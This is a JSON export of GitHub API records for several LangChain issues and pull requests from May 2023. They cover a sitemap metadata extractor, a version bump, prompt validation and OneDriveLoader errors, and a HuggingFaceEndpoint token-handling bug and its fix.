            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4347",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4347",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4347.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4347.patch",
            "merged_at": "2023-05-09T17:18:33Z"
        },
        "body": "# Sitemap Metadata extractor\r\n\r\nthis pr makes it possible to extract more metadata from websites for later use.\r\n\r\nmy usecase:\r\nparsing ld+json or microdata from sites and store it as structured data in the metadata field",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4347/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4347/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4346",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4346/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4346/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4346/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4346",
        "id": 1700498392,
        "node_id": "PR_kwDOIPDwls5QA2pL",
        "number": 4346,
        "title": "bump ver 162",
        "user": {
            "login": "hwchase17",
            "id": 11986836,
            "node_id": "MDQ6VXNlcjExOTg2ODM2",
            "avatar_url": "https://avatars.githubusercontent.com/u/11986836?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/hwchase17",
            "html_url": "https://github.com/hwchase17",
            "followers_url": "https://api.github.com/users/hwchase17/followers",
            "following_url": "https://api.github.com/users/hwchase17/following{/other_user}",
            "gists_url": "https://api.github.com/users/hwchase17/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hwchase17/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hwchase17/subscriptions",
            "organizations_url": "https://api.github.com/users/hwchase17/orgs",
            "repos_url": "https://api.github.com/users/hwchase17/repos",
            "events_url": "https://api.github.com/users/hwchase17/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hwchase17/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5010622926,
                "node_id": "LA_kwDOIPDwls8AAAABKqgJzg",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/release",
                "name": "release",
                "color": "07D4BE",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T15:47:14Z",
        "updated_at": "2023-05-08T16:28:43Z",
        "closed_at": "2023-05-08T16:28:42Z",
        "author_association": "COLLABORATOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4346",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4346",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4346.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4346.patch",
            "merged_at": "2023-05-08T16:28:42Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4346/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4346/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4345",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4345/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4345/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4345/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4345",
        "id": 1700472614,
        "node_id": "I_kwDOIPDwls5lWycm",
        "number": 4345,
        "title": "Problem with ZeroShotAgent.create_prompt()",
        "user": {
            "login": "mattia-bolognesi",
            "id": 68070389,
            "node_id": "MDQ6VXNlcjY4MDcwMzg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/68070389?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/mattia-bolognesi",
            "html_url": "https://github.com/mattia-bolognesi",
            "followers_url": "https://api.github.com/users/mattia-bolognesi/followers",
            "following_url": "https://api.github.com/users/mattia-bolognesi/following{/other_user}",
            "gists_url": "https://api.github.com/users/mattia-bolognesi/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/mattia-bolognesi/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/mattia-bolognesi/subscriptions",
            "organizations_url": "https://api.github.com/users/mattia-bolognesi/orgs",
            "repos_url": "https://api.github.com/users/mattia-bolognesi/repos",
            "events_url": "https://api.github.com/users/mattia-bolognesi/events{/privacy}",
            "received_events_url": "https://api.github.com/users/mattia-bolognesi/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2023-05-08T15:27:44Z",
        "updated_at": "2023-09-10T16:20:07Z",
        "closed_at": "2023-09-10T16:20:07Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Discussed in https://github.com/hwchase17/langchain/discussions/4341\r\n\r\n<div type='discussions-op-text'>\r\n\r\n<sup>Originally posted by **mattia-bolognesi** May  8, 2023</sup>\r\nI have a problem when running this script, basically gives an error on the ZeroAgent class:\r\n\r\n```\r\nprompt = ZeroShotAgent.create_prompt(\r\n            tools,\r\n            prefix=prefix,\r\n            suffix=suffix,\r\n            input_variables=[\"input\", \"chat_history\", \"agent_scratchpad\"],\r\n        )\r\n```\r\n\r\nThe error is:\r\n```\r\n\"ValidationError: 1 validation error for PromptTemplate _root_ Invalid prompt schema; check for mismatched or missing input parameters. {'input', 'agent_scratchpad', 'chat_history'} (type=value_error)\".\r\n```</div>",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4345/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4345/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4343",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4343/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4343/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4343/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4343",
        "id": 1700415939,
        "node_id": "I_kwDOIPDwls5lWknD",
        "number": 4343,
        "title": "OneDriveLoader: NameError: name 'Account' is not defined. Did you mean: 'account'?",
        "user": {
            "login": "ruckc",
            "id": 1426401,
            "node_id": "MDQ6VXNlcjE0MjY0MDE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1426401?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/ruckc",
            "html_url": "https://github.com/ruckc",
            "followers_url": "https://api.github.com/users/ruckc/followers",
            "following_url": "https://api.github.com/users/ruckc/following{/other_user}",
            "gists_url": "https://api.github.com/users/ruckc/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/ruckc/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/ruckc/subscriptions",
            "organizations_url": "https://api.github.com/users/ruckc/orgs",
            "repos_url": "https://api.github.com/users/ruckc/repos",
            "events_url": "https://api.github.com/users/ruckc/events{/privacy}",
            "received_events_url": "https://api.github.com/users/ruckc/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 8,
        "created_at": "2023-05-08T14:57:18Z",
        "updated_at": "2023-11-13T16:09:26Z",
        "closed_at": "2023-11-13T16:09:25Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\n\nLangChain: 0.0.161\r\nPlatform: Ubuntu 22.04.2 LTS\r\nPython Version: 3.10.6\r\n\r\nWhen trying to use the new OneDriveLoader, I get the below error.  \r\n\r\n```\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"/home/user/.cache/pypoetry/virtualenvs/test-r_fbvPX4-py3.10/lib/python3.10/site-packages/langchain/document_loaders/onedrive.py\", line 223, in load\r\n    account = self._auth()\r\n  File \"/home/user/.cache/pypoetry/virtualenvs/test-r_fbvPX4-py3.10/lib/python3.10/site-packages/langchain/document_loaders/onedrive.py\", line 102, in _auth\r\n    account = Account(\r\nNameError: name 'Account' is not defined. Did you mean: 'account'?\r\n```\r\n\r\nI believe the issue is with the Account import in onedrive.py, since `Account` is only imported during type checking, so its not available for runtime and your instantiating an `Account` object further down.\r\n\r\nhttps://github.com/hwchase17/langchain/blob/16e766376221ee8b514d78ae8c38e273eca30f25/langchain/document_loaders/onedrive.py#L17-L18\r\n\r\nhttps://github.com/hwchase17/langchain/blob/16e766376221ee8b514d78ae8c38e273eca30f25/langchain/document_loaders/onedrive.py#L102-L110\r\n\n\n### Who can help?\n\n@hwchase17 / @eyurtsev \n\n### Information\n\n- [ ] The official example notebooks/scripts\n- [ ] My own modified scripts\n\n### Related Components\n\n- [ ] LLMs/Chat Models\n- [ ] Embedding Models\n- [ ] Prompts / Prompt Templates / Prompt Selectors\n- [ ] Output Parsers\n- [X] Document Loaders\n- [ ] Vector Stores / Retrievers\n- [ ] Memory\n- [ ] Agents / Agent Executors\n- [ ] Tools / Toolkits\n- [ ] Chains\n- [ ] Callbacks/Tracing\n- [ ] Async\n\n### Reproduction\n\nimport os\r\nfrom langchain.document_loaders import OneDriveLoader\r\n# assume O365_CLIENT_ID / O365_CLIENT_SECRET are also present\r\nloader = OneDriveLoader(drive_id=os.getenv('O365_DRIVE_ID'))\r\ndocuments = loader.load()\r\nprint(documents)\n\n### Expected behavior\n\na list of printed documents",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4343/reactions",
            "total_count": 3,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 1
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4343/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4342",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4342/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4342/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4342/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4342",
        "id": 1700410051,
        "node_id": "PR_kwDOIPDwls5QAjSL",
        "number": 4342,
        "title": "Update gallery.rst with chatpdf opensource",
        "user": {
            "login": "akshata29",
            "id": 18509807,
            "node_id": "MDQ6VXNlcjE4NTA5ODA3",
            "avatar_url": "https://avatars.githubusercontent.com/u/18509807?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/akshata29",
            "html_url": "https://github.com/akshata29",
            "followers_url": "https://api.github.com/users/akshata29/followers",
            "following_url": "https://api.github.com/users/akshata29/following{/other_user}",
            "gists_url": "https://api.github.com/users/akshata29/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/akshata29/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/akshata29/subscriptions",
            "organizations_url": "https://api.github.com/users/akshata29/orgs",
            "repos_url": "https://api.github.com/users/akshata29/repos",
            "events_url": "https://api.github.com/users/akshata29/events{/privacy}",
            "received_events_url": "https://api.github.com/users/akshata29/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5454193895,
                "node_id": "LA_kwDOIPDwls8AAAABRRhk5w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/lgtm",
                "name": "lgtm",
                "color": "0E8A16",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T14:54:30Z",
        "updated_at": "2023-05-15T02:43:17Z",
        "closed_at": "2023-05-15T02:43:16Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4342",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4342",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4342.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4342.patch",
            "merged_at": "2023-05-15T02:43:16Z"
        },
        "body": null,
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4342/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4342/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4337",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4337/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4337/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4337/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4337",
        "id": 1700324555,
        "node_id": "PR_kwDOIPDwls5QAQvO",
        "number": 4337,
        "title": "Add example on how to use Featureform with langchain",
        "user": {
            "login": "simba-git",
            "id": 64661186,
            "node_id": "MDQ6VXNlcjY0NjYxMTg2",
            "avatar_url": "https://avatars.githubusercontent.com/u/64661186?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/simba-git",
            "html_url": "https://github.com/simba-git",
            "followers_url": "https://api.github.com/users/simba-git/followers",
            "following_url": "https://api.github.com/users/simba-git/following{/other_user}",
            "gists_url": "https://api.github.com/users/simba-git/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/simba-git/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/simba-git/subscriptions",
            "organizations_url": "https://api.github.com/users/simba-git/orgs",
            "repos_url": "https://api.github.com/users/simba-git/repos",
            "events_url": "https://api.github.com/users/simba-git/events{/privacy}",
            "received_events_url": "https://api.github.com/users/simba-git/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T14:06:03Z",
        "updated_at": "2023-05-08T17:32:17Z",
        "closed_at": "2023-05-08T17:32:17Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4337",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4337",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4337.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4337.patch",
            "merged_at": "2023-05-08T17:32:17Z"
        },
        "body": "Added an example on how to use Featureform to connecting_to_a_feature_store.ipynb .",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4337/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4337/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4336",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4336/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4336/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4336/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4336",
        "id": 1700268508,
        "node_id": "PR_kwDOIPDwls5QAElr",
        "number": 4336,
        "title": "make running specific unit tests easier",
        "user": {
            "login": "rick2047",
            "id": 16410,
            "node_id": "MDQ6VXNlcjE2NDEw",
            "avatar_url": "https://avatars.githubusercontent.com/u/16410?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rick2047",
            "html_url": "https://github.com/rick2047",
            "followers_url": "https://api.github.com/users/rick2047/followers",
            "following_url": "https://api.github.com/users/rick2047/following{/other_user}",
            "gists_url": "https://api.github.com/users/rick2047/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rick2047/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rick2047/subscriptions",
            "organizations_url": "https://api.github.com/users/rick2047/orgs",
            "repos_url": "https://api.github.com/users/rick2047/repos",
            "events_url": "https://api.github.com/users/rick2047/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rick2047/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 5454193895,
                "node_id": "LA_kwDOIPDwls8AAAABRRhk5w",
                "url": "https://api.github.com/repos/langchain-ai/langchain/labels/lgtm",
                "name": "lgtm",
                "color": "0E8A16",
                "default": false,
                "description": ""
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 7,
        "created_at": "2023-05-08T13:34:03Z",
        "updated_at": "2023-05-10T14:55:13Z",
        "closed_at": "2023-05-10T13:39:23Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4336",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4336",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4336.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4336.patch",
            "merged_at": "2023-05-10T13:39:23Z"
        },
        "body": "I find it's easier to do TDD if i can run specific unit tests. I know watch is there but some people prefer running their tests manually.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4336/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4336/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4335",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4335/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4335/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4335/events",
        "html_url": "https://github.com/langchain-ai/langchain/pull/4335",
        "id": 1700216045,
        "node_id": "PR_kwDOIPDwls5P_5Do",
        "number": 4335,
        "title": "Fixed huggingfacehub_api_token hadning in HuggingFaceEndpoint",
        "user": {
            "login": "PawelFaron",
            "id": 42373772,
            "node_id": "MDQ6VXNlcjQyMzczNzcy",
            "avatar_url": "https://avatars.githubusercontent.com/u/42373772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/PawelFaron",
            "html_url": "https://github.com/PawelFaron",
            "followers_url": "https://api.github.com/users/PawelFaron/followers",
            "following_url": "https://api.github.com/users/PawelFaron/following{/other_user}",
            "gists_url": "https://api.github.com/users/PawelFaron/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/PawelFaron/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/PawelFaron/subscriptions",
            "organizations_url": "https://api.github.com/users/PawelFaron/orgs",
            "repos_url": "https://api.github.com/users/PawelFaron/repos",
            "events_url": "https://api.github.com/users/PawelFaron/events{/privacy}",
            "received_events_url": "https://api.github.com/users/PawelFaron/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2023-05-08T13:03:08Z",
        "updated_at": "2023-05-08T15:29:18Z",
        "closed_at": "2023-05-08T15:29:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/pulls/4335",
            "html_url": "https://github.com/langchain-ai/langchain/pull/4335",
            "diff_url": "https://github.com/langchain-ai/langchain/pull/4335.diff",
            "patch_url": "https://github.com/langchain-ai/langchain/pull/4335.patch",
            "merged_at": "2023-05-08T15:29:18Z"
        },
        "body": "Reported here:\r\nhttps://github.com/hwchase17/langchain/issues/4334",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4335/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4335/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4334",
        "repository_url": "https://api.github.com/repos/langchain-ai/langchain",
        "labels_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4334/labels{/name}",
        "comments_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4334/comments",
        "events_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4334/events",
        "html_url": "https://github.com/langchain-ai/langchain/issues/4334",
        "id": 1700100642,
        "node_id": "I_kwDOIPDwls5lVXoi",
        "number": 4334,
        "title": "Empty API token in HuggingFaceEndpoint unless explicitly passed to Constructor",
        "user": {
            "login": "gil-frenkel-marpai",
            "id": 91870657,
            "node_id": "U_kgDOBXnVwQ",
            "avatar_url": "https://avatars.githubusercontent.com/u/91870657?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/gil-frenkel-marpai",
            "html_url": "https://github.com/gil-frenkel-marpai",
            "followers_url": "https://api.github.com/users/gil-frenkel-marpai/followers",
            "following_url": "https://api.github.com/users/gil-frenkel-marpai/following{/other_user}",
            "gists_url": "https://api.github.com/users/gil-frenkel-marpai/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/gil-frenkel-marpai/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/gil-frenkel-marpai/subscriptions",
            "organizations_url": "https://api.github.com/users/gil-frenkel-marpai/orgs",
            "repos_url": "https://api.github.com/users/gil-frenkel-marpai/repos",
            "events_url": "https://api.github.com/users/gil-frenkel-marpai/events{/privacy}",
            "received_events_url": "https://api.github.com/users/gil-frenkel-marpai/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2023-05-08T11:48:06Z",
        "updated_at": "2023-10-15T18:12:50Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### System Info\r\n\r\nSystem: Linux\r\nKernel: Linux version 5.15.0-1026-aws (buildd@lcy02-amd64-088) ( gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0 )\r\nPython version: 3.8.16\r\nLangChain version: 0.0.157\r\n\r\n### Who can help?\r\n\r\n@hwchase17 \r\n\r\n\r\n### Information\r\n\r\n- [ ] The official example notebooks/scripts\r\n- [ ] My own modified scripts\r\n\r\n### Related Components\r\n\r\n- [X] LLMs/Chat Models\r\n- [ ] Embedding Models\r\n- [ ] Prompts / Prompt Templates / Prompt Selectors\r\n- [ ] Output Parsers\r\n- [ ] Document Loaders\r\n- [ ] Vector Stores / Retrievers\r\n- [ ] Memory\r\n- [ ] Agents / Agent Executors\r\n- [ ] Tools / Toolkits\r\n- [ ] Chains\r\n- [ ] Callbacks/Tracing\r\n- [ ] Async\r\n\r\n### Reproduction\r\n\r\nUpon constructing the HuggingFaceEndpoint, when the API token is set as an environment variable (not passing to the constructor), the attribute ```huggingface_api_token``` will always be empty, causing a missing token in the request headers:\r\n\r\n```\r\nfrom dotenv import load_dotenv\r\nload_dotenv()\r\n\r\nllm = HuggingFaceEndpoint(\r\n    endpoint_url=\"togethercomputer/RedPajama-INCITE-Instruct-7B-v0.1\",\r\n    task=\"text-generation\"\r\n)\r\n\r\nprint(llm.huggingfacehub_api_token)\r\nprint(\"What is the capital of France?\")\r\n\r\n```\r\n\r\nOutput:\r\n\r\n```\r\nNone\r\nTraceback (most recent call last):\r\n  File \"research/red_pajama.py\", line 58, in <module>\r\n    print(llm(\"What is the capital of France?\"))\r\n  File \"/home/ubuntu/miniconda3/envs/marpai_llm/lib/python3.8/site-packages/langchain/llms/base.py\", line 281, in __call__\r\n    self.generate([prompt], stop=stop, callbacks=callbacks)\r\n  File \"/home/ubuntu/miniconda3/envs/marpai_llm/lib/python3.8/site-packages/langchain/llms/base.py\", line 176, in generate\r\n    raise e\r\n  File \"/home/ubuntu/miniconda3/envs/marpai_llm/lib/python3.8/site-packages/langchain/llms/base.py\", line 170, in generate\r\n    self._generate(prompts, stop=stop, run_manager=run_manager)\r\n  File \"/home/ubuntu/miniconda3/envs/marpai_llm/lib/python3.8/site-packages/langchain/llms/base.py\", line 377, in _generate\r\n    self._call(prompt, stop=stop, run_manager=run_manager)\r\n  File \"/home/ubuntu/miniconda3/envs/marpai_llm/lib/python3.8/site-packages/langchain/llms/huggingface_endpoint.py\", line 133, in _call\r\n    raise ValueError(\r\nValueError: Error raised by inference API: Authorization header is correct, but the token seems invalid\r\n```\r\n\r\nValueError exception raised here:\r\n[https://github.com/hwchase17/langchain/blob/65c95f9fb2b86cf3281f2f3939b37e71f048f741/langchain/llms/huggingface_endpoint.py#L118](https://github.com/hwchase17/langchain/blob/65c95f9fb2b86cf3281f2f3939b37e71f048f741/langchain/llms/huggingface_endpoint.py#L118)\r\n\r\n\r\n### Expected behavior\r\n\r\nhuggingFaceEndpoint should send a valid POST request to inference API.",
        "reactions": {
            "url": "https://api.github.com/repos/langchain-ai/langchain/issues/4334/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/langchain-ai/langchain/issues/4334/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    }
]